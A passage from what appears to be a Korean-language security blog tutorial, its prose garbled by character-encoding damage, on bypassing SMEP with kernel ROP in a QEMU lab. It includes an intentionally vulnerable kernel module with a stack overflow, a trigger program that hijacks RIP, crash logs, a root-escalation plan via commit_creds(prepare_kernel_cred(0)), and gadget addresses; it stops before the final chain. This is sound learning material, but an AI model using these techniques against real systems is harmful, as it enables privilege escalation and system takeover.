Tainted: G           O      5.8.5 #1[    4.738838] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    4.739732] RIP: 0010:0x400c54[    4.740234] Code: Bad RIP value.[    4.740527] RSP: 0018:ffffc9000019feb8 EFLAGS: 00000246[    4.740937] RAX: 0000000000400c54 RBX: 0000000000000008 RCX: 0000000000000000[    4.741387] RDX: 0000000000000000 RSI: 00007ffe415d0348 RDI: ffffc9000019fec8[    4.741846] RBP: ffff88801d91e900 R08: 0000000000400c54 R09: 0000000000000000[    4.742300] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000[    4.742802] R13: 0000000000000008 R14: ffffc9000019ff10 R15: 00007ffe415d0340[    4.743299] FS:  00000000018a3880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000[    4.743928] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    4.744355] CR2: 0000000000400c54 CR3: 000000001d972000 CR4: 00000000001006f0[    4.744946] Call Trace:[    4.746173]  ? test_write+0x32/0x50 [test][    4.747038]  ? vfs_write+0xc2/0x1f0[    4.747557]  ? ksys_write+0x5a/0xd0[    4.751948]  ? do_syscall_64+0x3e/0x70[    4.753504]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    4.754301] Modules linked in: test(O)[    4.755895] CR2: 0000000000400c54[    4.758935] ---[ end trace 5a1c612f112c704d ]---[    4.759909] RIP: 0010:0x400c54[    4.760269] Code: Bad RIP value.[    4.760478] RSP: 0018:ffffc9000019feb8 EFLAGS: 00000246[    4.760915] RAX: 0000000000400c54 RBX: 0000000000000008 RCX: 0000000000000000[    4.761419] RDX: 0000000000000000 RSI: 00007ffe415d0348 RDI: ffffc9000019fec8[    4.761869] RBP: ffff88801d91e900 R08: 0000000000400c54 R09: 0000000000000000[    4.762291] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000[    4.762884] R13: 0000000000000008 R14: ffffc9000019ff10 R15: 00007ffe415d0340[    4.763462] FS:  00000000018a3880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000[    4.763968] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    4.764323] CR2: 0000000000400c54 CR3: 000000001d972000 CR4: 00000000001006f0[    4.764956] Kernel panic - not syncing: Fatal exception[    4.766565] Kernel Offset: disabled[    4.767284] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre><p>ë‹¤ìŒê³¼ ê°™ì´ smepì´ ì ìš©ëœ ë¦¬ëˆ…ìŠ¤ í™˜ê²½ì—ì„œ ìœ ì €ì˜ì—­ì—ì„œì˜ í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰ì‹œí‚¬ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì€ ë¬¸ì œê°€ ë°œìƒí•œë‹¤.</p></br><p><img src="/img/cr4.PNG"></p><p>SMEPì€ CPUì˜ CR4 Registerì˜ SMEPì— í•´ë‹¹í•˜ëŠ” ë¶€ë¶„ì˜ ë¹„íŠ¸ë¥¼ í‚¤ê±°ë‚˜ ë”ìœ¼ë¡œ ì ìš©ì´ ê°€ëŠ¥í•˜ë‹¤. ê·¸ë ‡ë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ìƒê°ì„ í•  ìˆ˜ ìˆë‹¤. ì„¸ìƒì´ ê·¸ë ‡ê²Œ ê°„ë‹¨í•˜ì§„ ì•Šì§€ë§Œ ê³µê²©ìê°€ CR4 ë ˆì§€ìŠ¤í„°ì˜ ì›í•˜ëŠ” ë¶€ë¶„ì„ ì œì–´(control)í•  ìˆ˜ ìˆë‹¤ë©´ SMEPì„ ìš°íšŒí•  ìˆ˜ ìˆì§€ ì•Šì„ê¹Œë¼ëŠ” ìƒê°ì„ í–ˆì—ˆê³  ìë£Œì¡°ì‚¬ ê²°ê³¼ ì‹¤ì œë¡œ ì´ëŸ¬í•œ ê³µê²©ê¸°ë²•ì„ ì´ìš©í•  ìˆ˜ ìˆë‹¤ëŠ” ê²°ë¡ ë¥¼ ì–»ì—ˆë‹¤. í•˜ì§€ë§Œ í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ë³´ë‹¤ ë²”ìš©ì ì¸ Kernelê¸°ë°˜ì˜ ROPë¥¼ ì´ìš©í•´ì„œ ìš°íšŒí•  ì˜ˆì •ì´ë‹¤. </p><pre><code>ë°±ë¬¸ì´ ë¶ˆì—¬ì¼ê²©, ì‹¤ì œ ë°”ì´ë„ˆë¦¬ë¥¼ í†µí•´ í•´ë‹¹ ê³µê²©ì„ ì ìš©í•´ë³´ê² ë‹¤.</code></pre><p></br></br></p><h2 id="í™˜ê²½ë¶„ì„"><a href="#í™˜ê²½ë¶„ì„" class="headerlink" title="í™˜ê²½ë¶„ì„"></a>í™˜ê²½ë¶„ì„</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \-m 512M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic  \-cpu qemu64,smep \</code></pre><p>ë¶€íŒ… ìŠ¤í¬ë¦½íŠ¸ì˜ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ ì‘ì„±ë˜ì–´ ìˆë‹¤. í™•ì¸í•´ì•¼ í•˜ëŠ” ë¶€ë¶„ì€ í•´ë‹¹ í¬ìŠ¤íŠ¸ì˜ ëª©ì ì€ SMEPìš°íšŒë¥¼ ì£¼ëª©ì ìœ¼ë¡œ í•˜ê¸°ì— KASLRì„ ë¹„í™œì„±í™” í•´ë‘ì—ˆìœ¼ë©° CPU ì˜µì…˜ì—ëŠ” SMEPì´ ì ìš©ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p></br></br></p><h2 id="ë°”ì´ë„ˆë¦¬-ë¶„ì„"><a href="#ë°”ì´ë„ˆë¦¬-ë¶„ì„" class="headerlink" title="ë°”ì´ë„ˆë¦¬ ë¶„ì„"></a>ë°”ì´ë„ˆë¦¬ ë¶„ì„</h2><h3 id="ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ"><a href="#ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ" class="headerlink" title="ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ"></a>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]);  // prevent undefined behavior<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure><p>í•´ë‹¹ ì†ŒìŠ¤ì½”ë“œì˜ ê²½ìš° ê³µê²© ë²¡í„°(attack vector)ê°€ ë  ìˆ˜ ìˆëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì˜ ì†ŒìŠ¤ì½”ë“œì´ë‹¤. ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•´ë³¼ ê²½ìš° file_operations êµ¬ì¡°ì²´ ë‚´ë¶€ì—ì„œ write ì‹œìŠ¤í…œ ì½œì— ëŒ€ì‘í•˜ëŠ” ë™ì‘ë“¤ì„ ì •ì˜í•˜ê³  ìˆë‹¤.</p><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì„ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° test_write() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²½ìš° line30~line33ì— ì˜í•˜ì—¬ ì»¤ë„ì—ì„œ ë©”ëª¨ë¦¬ë¥¼ ë™ì í• ë‹¹í•œ í›„ ìœ ì €ì˜ì—­ì—ì„œì˜ ë©”ëª¨ë¦¬ë¥¼ í•´ë‹¹ ë°ì´í„°ì˜ í¬ê¸°ë§Œí¼ ë³µì‚¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p>ì´ë¥¼ ê³ ë ¤í•´ë³´ë©´ ì‚¬ìš©ìê°€ ì…ë ¥í•œ ë°ì´í„°(untrusted input)ì˜ í¬ê¸°ë¥¼ ì œí•œí•˜ì§€ ì•ŠëŠ” ë¬¸ì œë¡œ ì¸í•´ì„œ ìŠ¤íƒ ë²„í¼ê¸°ë°˜ì˜ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•  ê²ƒìœ¼ë¡œ ì˜ˆìƒëœë‹¤.</p><p></br></br></p><h2 id="ì·¨ì•½ì -ë¶„ì„"><a href="#ì·¨ì•½ì -ë¶„ì„" class="headerlink" title="ì·¨ì•½ì  ë¶„ì„"></a>ì·¨ì•½ì  ë¶„ì„</h2><p><b>ë°”ì´ë„ˆë¦¬ ë¶„ì„</b>ì—ì„œ ì‚¬ìš©ìì˜ ì…ë ¥ìœ¼ë¡œ ë¶€í„° ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ê°€ëŠ¥ì„±ì´ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. í•´ë‹¹ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì´ í˜¸ì¶œë˜ê²Œ ë  ê²½ìš° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ ê²½ìš° ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì´ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ê¸° ë•Œë¬¸ì´ë‹¤. ì˜ˆìƒí•œ ê²°ê³¼ê°€ ë§ëŠ”ê°€ì— ëŒ€í•´ì„œ í™•ì¸í•´ë³¼ í•„ìš”ê°€ ìˆë‹¤.</p></br><h3 id="ê³µê²©-ì½”ë“œ"><a href="#ê³µê²©-ì½”ë“œ" class="headerlink" title="ê³µê²© ì½”ë“œ"></a>ê³µê²© ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">//gcc -masm=intel -static -o exp exp.c -no-pie<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    // STEP1. Generate Payload<br>    size_t payload[18] = &#123;0, &#125;;<br><br>    memset(payload, 0x41, 8);<br>    memset(payload+1, 0x42, 8);<br>    memset(payload+2, 0x43, 8);<br>    memset(payload+3, 0x44, 8);<br>    memset(payload+4, 0x45, 8);<br>    memset(payload+5, 0x46, 8);<br>    memset(payload+6, 0x47, 8);<br>    memset(payload+7, 0x48, 8);<br>    memset(payload+9, 0x49, 8);<br><br><br>    // STEP2. Exploit<br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì œì–´í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ë‹¤. ë²„í¼ì— ë°ì´í„°ë¥¼ ì–´ëŠì •ë„ ì‘ì„±í•´ì•¼ Return Addressë¥¼ ì»¨íŠ¸ë¡¤ í•  ìˆ˜ ìˆëŠ”ê°€ë¥¼ íŒŒì•…í•˜ê¸° ìœ„í•´ì„œ ì—°ì†ì ì¸ í˜•íƒœì˜ ì…ë ¥ì¸ â€œAAAâ€¦ABBB.Bâ€¦â€ë¥¼ ì…ë ¥í•˜ì˜€ë‹¤. ë§Œì•½ RIPê°€ í•´ë‹¹ ì…ë ¥ê°’ ì¤‘ í•˜ë‚˜ì˜ ê°’ìœ¼ë¡œ ë³€ì¡°ëœë‹¤ë©´ ì´ëŠ” ì‚¬ìš©ìì˜ ì…ë ¥ìœ¼ë¡œ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ì°¸ê³ ë¡œ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ëŠ” ë¹„í™œì„±í™” ìƒíƒœì´ë‹¤.</p><h3 id="ê³µê²©-ê²°ê³¼"><a href="#ê³µê²©-ê²°ê³¼" class="headerlink" title="ê³µê²© ê²°ê³¼"></a>ê³µê²© ê²°ê³¼</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./exploit [    5.999472] arr : 0[    5.999788] general protection fault: 0000 [#1] SMP NOPTI[    6.001957] CPU: 0 PID: 70 Comm: exploit Tainted: G           O      5.8.5 #1[    6.006606] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    6.009067] RIP: 0010:0x4545454545454545[    6.010246] Code: Bad RIP value.[    6.010565] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    6.011006] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000020727261[    6.011471] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    6.011960] RBP: 4343434343434343 R08: 0000000030203a20 R09: 0000000000000007[    6.012544] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 4444444444444444[    6.013009] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff970c7710[    6.013527] FS:  0000000000d43880(0000) GS:ffff88801ee00000(0000) knlGS:0000000000000000[    6.014132] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    6.014516] CR2: 000000000045a040 CR3: 000000001d10e000 CR4: 00000000001006f0[    6.015070] Call Trace:[    6.015986]  ? do_syscall_64+0x3e/0x70[    6.016964]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    6.017975] Modules linked in: test(O)[    6.019737] ---[ end trace 543408c634e8da58 ]---[    6.024399] RIP: 0010:0x4545454545454545[    6.024920] Code: Bad RIP value.[    6.026318] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    6.026874] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000020727261[    6.027339] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    6.028103] RBP: 4343434343434343 R08: 0000000030203a20 R09: 0000000000000007[    6.029610] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 4444444444444444[    6.030238] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff970c7710[    6.030691] FS:  0000000000d43880(0000) GS:ffff88801ee00000(0000) knlGS:0000000000000000[    6.031616] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    6.032050] CR2: 000000000045a040 CR3: 000000001d10e000 CR4: 00000000001006f0[    6.032733] Kernel panic - not syncing: Fatal exception[    6.033544] Kernel Offset: disabled[    6.034313] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre><p>í•´ë‹¹ ê²°ê³¼ë¥¼ í†µí•´ RIPê°€ 0x4545454545454545ë¡œ ë³€ì¡°ë˜ì—ˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆê³  í•´ë‹¹ ê°’ì€ ì‚¬ìš©ìê°€ ì…ë ¥í•  ë²„í¼ì˜ 32ë§Œí¼ì˜ ì…ë ¥í•œ ë’¤ì˜ ê°’ì´ë‹¤. ê·¸ëŸ¬ë¯€ë¡œ payload[4]ì— ê°’ì„ ì‘ì„±í•  ê²½ìš° í•´ë‹¹ ê°’ìœ¼ë¡œ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆë‹¤.</p><p></br></br></p><h2 id="ì·¨ì•½ì -ê³µê²©"><a href="#ì·¨ì•½ì -ê³µê²©" class="headerlink" title="ì·¨ì•½ì  ê³µê²©"></a>ì·¨ì•½ì  ê³µê²©</h2><p>ë¶„ì„ê³¼ì •ì„ í†µí•´ ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì„ í†µí•´ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. ì´ëŸ¬í•œ ì •ë³´ë“¤ì„ í† ëŒ€ë¡œ ê³µê²©ìì—ê²Œ ìœ ì˜ë¯¸í•œ í˜•íƒœì˜ ê³µê²©ì´ ë  ìˆ˜ ìˆë„ë¡ ì–´ë– í•œ í˜•íƒœë¡œ ê³µê²©ì„ ì§„í–‰í•  ê²ƒì¸ê°€ì— ëŒ€í•´ì„œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì‘ì„±í•˜ê² ë‹¤.</p><p>ê°€ì¥ íŒŒê¸‰ë ¥ìˆê³  ê³µê²©ìì—ê²Œ ììœ ë„ê°€ ë†’ì€ ë°©ë²•ì€ ë¦¬ëˆ…ìŠ¤(linux) ê¸°ë°˜ì˜ ì»¤ë„ì„ ê³µê²©í•˜ëŠ” ê²ƒì´ê¸°ì— ë£¨íŠ¸ ê¶Œí•œì˜ ì‰˜(shell)ì„ íšë“í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ê³µê²©ì´ ì´ë£¨ì–´ì§€ê¸° ìœ„í•´ì„œëŠ” ìš°ì„ ì ìœ¼ë¡œ ì§„í–‰ë˜ì–´ì•¼ í•˜ëŠ” ê²ƒì´ ìœ ì € ê¶Œí•œì„ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ìƒìŠ¹(ê¶Œí•œ ìƒìŠ¹)ì„ ì¼ìœ¼ì¼œì•¼ í•œë‹¤. </p><h3 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤</h3><pre><code>STEP1. commit_creds(prepare_kernel_cred(0))ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹STEP2. ì‚¬ìš©ì ëª¨ë“œ(user mode)ë¡œì˜ ì „í™˜STEP3. shell íšë“</code></pre><p>ë‹¤ìŒì˜ ì‹œë‚˜ë¦¬ì˜¤ëŠ” SMEPì´ ì ìš©ë˜ì–´ ìˆì§€ ì•Šì€ ì¼ë°˜ì ì¸ í˜•íƒœì˜ ê³µê²©(exploit)ê³¼ ìœ ì‚¬í•˜ë‹¤. Memory Randomizationì´ ì ìš©ë˜ì–´ ìˆì§€ ì•Šê¸° ë•Œë¬¸ì— ì‹¤í–‰ì‹œí‚¤ê³ ì í•˜ëŠ” í•¨ìˆ˜ì¸ commit_creds(), prepare_kernel_cred()ë¥¼ í•˜ë“œì½”ë”©í•˜ì—¬ ê°’ì„ ì‘ì„±í•´ë„ ëœë‹¤.</p><p>ì—¬ê¸°ì„œ ê³ ë ¤í•´ì•¼í•˜ëŠ” ì‚¬í•­ì€ ìŠˆí¼ë°”ì´ì € ëª¨ë“œ(ring0)ì—ì„œ ìœ ì €ì˜ì—­ì˜ payloadë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— ê¶Œí•œ ìƒìŠ¹ì„ commit_creds(prepare_kernel_cred(0)) ì¼ìœ¼í‚¨ í›„ ìœ ì € ëª¨ë“œë¡œ ì „í™˜í•˜ëŠ” ê³¼ì •ì„ ì»¤ë„ì—ì„œ ì§„í–‰í•´ì•¼ í•œë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ì´ëŸ¬í•œ ê³¼ì •ì€ Kernel ROPë¥¼ í†µí•´ ROP Payloadì—ì„œ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.</p><h3 id="ê°€ì ¯-êµ¬ì„±"><a href="#ê°€ì ¯-êµ¬ì„±" class="headerlink" title="ê°€ì ¯ êµ¬ì„±"></a>ê°€ì ¯ êµ¬ì„±</h3><p><img src="/img/calling_convetion.PNG" alt="Linux 64bit - calling convention"></p><p>ROP Payloadë¥¼ ì‘ì„±í•˜ê¸°ì— ì•ì„œ commit_creds()ì™€ prepare_kernel_cred(NULL)ì„ ìˆ˜í–‰í•´ì•¼ í•˜ê¸°ì— í˜„ì¬ì˜ ì•„í‚¤í…ì³(intel x86/64)ì—ì„œ í•¨ìˆ˜ í˜¸ì¶œê·œì•½ì„ í™•ì¸í•´ë³¼ í•„ìš”ê°€ ìˆë‹¤. í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ì¸ìê°€ RDI, RSI, RDX, RCX, R8, R9, stackì„ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ì „ë‹¬ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ê·¸ë¦¬ê³  ìƒë‹¨ì˜ ê·¸ë¦¼ì—ì„œëŠ” ì–¸ê¸‰ë˜ì–´ ìˆì§€ ì•Šì§€ë§Œ prepare_kernel_cred() í•¨ìˆ˜ì˜ ë°˜í™˜ê°’ì˜ ê²½ìš°ëŠ” RAXì— ë‹´ê¸´ë‹¤. ì´ëŸ¬í•œ ê³¼ì •ì„ í†µí•´ì„œ ê°€ì ¯ì„ êµ¬ì„±í•  ìˆ˜ ìˆë‹¤.</p></br><pre><code>prepare_kernel_cred() [RDI:0]mov rdi, raxcommit_creds() [RDI: ê²°ê³¼ê°’]swapgsiretq</code></pre><p>ëŒ€ëµì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ ëª…ë ¹ì–´ê°€ ìˆ˜í–‰ë˜ì–´ì•¼ í•œë‹¤. prepare_kernel_cred()ë¥¼ í˜¸ì¶œí•  ê²½ìš° ì²« ë²ˆì§¸ ì¸ìì¸ RDIì˜ ê²½ìš° 0(NULL)ë¡œ ì„¸íŒ…ë˜ì–´ ìˆì–´ì•¼ í•˜ë©° í•´ë‹¹ í•¨ìˆ˜ì˜ ë°˜í™˜ê°’ì´ commit_creds() í•¨ìˆ˜ì˜ ì²« ë²ˆì§¸ì¸ìë¡œ êµ¬ì„±ë˜ì–´ì•¼ í•œë‹¤. ì´í›„ ë‹¤ì‹œ ìœ ì €ëª¨ë“œì˜ ì „í™˜ì´ ì¼ì–´ë‚˜ì•¼ í•œë‹¤.</p><h3 id="ê°€ì ¯-ì¶”ì¶œ"><a href="#ê°€ì ¯-ì¶”ì¶œ" class="headerlink" title="ê°€ì ¯ ì¶”ì¶œ"></a>ê°€ì ¯ ì¶”ì¶œ</h3><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rdi&quot; | grep -a2 &quot;ret&quot;ffffffff813fb9bb:    5a                       pop    rdxffffffff813fb9bc:    5f                       pop    rdiffffffff813fb9bd:    c3                       ret     </code></pre></br><pre><code>$ ROPgadget --binary vmlinux | grep &quot;mov rdi, rax&quot;0xffffffff82a081f0 : mov rdi, rax ; rep movsd dword ptr [rdi], dword ptr [rsi] ; ret0xffffffff81132ad8 : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff811329700xffffffff81b2413b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</code></pre></br><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rcx&quot; | grep -a2 &quot;ret&quot;ffffffff81057091:    8b 44 24 04              mov    eax,DWORD PTR [rsp+0x4]ffffffff81057095:    59                       pop    rcxffffffff81057096:    c3                       ret    --ffffffff8105c7bb:    e8 20 fd ff ff           call   0xffffffff8105c4e0--ffffffff8119a9f1:    5a                       pop    rdxffffffff8119a9f2:    59                       pop    rcxffffffff8119a9f3:    c3                       ret    --ffffffff8119ab2b:    5a                       pop    rdx--ffffffff8119acd6:    5a                       pop    rdxffffffff8119acd7:    59                       pop    rcxffffffff8119acd8:    c3                       ret   </code></pre></br><pre><code>$ ROPgadget --binary vmlinux | grep &quot;swapgs&quot;0xffffffff81c00f57 : nop ; swapgs ; ret</code></pre></br><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;iretq&quot;ffffffff810252ad:    68 b4 52 02 81           push   0xffffffff810252b4ffffffff810252b2:    48 cf                    iretq  ffffffff810252b4:    c3                       ret </code></pre><p>ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ 